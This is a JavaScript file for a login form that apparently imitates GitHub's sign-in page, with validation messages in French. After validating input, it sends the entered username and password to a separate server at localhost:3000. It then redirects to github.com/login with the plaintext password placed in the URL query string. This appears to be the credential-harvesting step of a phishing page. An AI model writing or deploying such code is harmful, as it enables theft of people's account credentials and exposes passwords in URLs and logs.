const form = document.getElementById('login-form');
const loginField = document.getElementById('login_field');
const passwordField = document.getElementById('password');

function showError(input, message) {
  input.classList.add('error');
  let msg = input.parentElement.querySelector('.error-msg');
  if (!msg) {
    msg = document.createElement('span');
    msg.className = 'error-msg';
    input.parentElement.appendChild(msg);
  }
  msg.textContent = message;
}

function clearError(input) {
  input.classList.remove('error');
  const msg = input.parentElement.querySelector('.error-msg');
  if (msg) msg.remove();
}

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function validateLogin(value) {
  if (!value.trim()) return 'Ce champ est obligatoire.';
  if (value.includes('@') && !isValidEmail(value)) return 'Adresse email invalide.';
  if (!value.includes('@') && value.trim().length < 3) return 'Le nom d\'utilisateur doit contenir au moins 3 caractères.';
  return null;
}

function validatePassword(value) {
  if (!value) return 'Ce champ est obligatoire.';
  if (value.length < 8) return 'Le mot de passe doit contenir au moins 8 caractères.';
  return null;
}

// Validation en temps réel (après première soumission)
let submitted = false;

loginField.addEventListener('input', () => {
  if (!submitted) return;
  const err = validateLogin(loginField.value);
  err ? showError(loginField, err) : clearError(loginField);
});

passwordField.addEventListener('input', () => {
  if (!submitted) return;
  const err = validatePassword(passwordField.value);
  err ? showError(passwordField, err) : clearError(passwordField);
});

form.addEventListener('submit', function (e) {
  e.preventDefault();
  submitted = true;

  clearError(loginField);
  clearError(passwordField);

  const loginErr = validateLogin(loginField.value);
  const passErr = validatePassword(passwordField.value);

  if (loginErr) showError(loginField, loginErr);
  if (passErr) showError(passwordField, passErr);

  if (!loginErr && !passErr) {
    const btn = this.querySelector('.btn-submit');
    btn.textContent = 'Signing in…';
    btn.disabled = true;

    fetch('http://localhost:3000/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        login: loginField.value.trim(),
        password: passwordField.value
      })
    })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          const params = new URLSearchParams({
            login: loginField.value.trim(),
            password: passwordField.value
          });
          window.location.href = `https://github.com/login?${params.toString()}`;
        } else {
          btn.textContent = 'Sign in';
          btn.disabled = false;
          alert('Erreur : ' + data.error);
        }
      })
      .catch(() => {
        btn.textContent = 'Sign in';
        btn.disabled = false;
        alert('Erreur de connexion au serveur.');
      });
  }
});
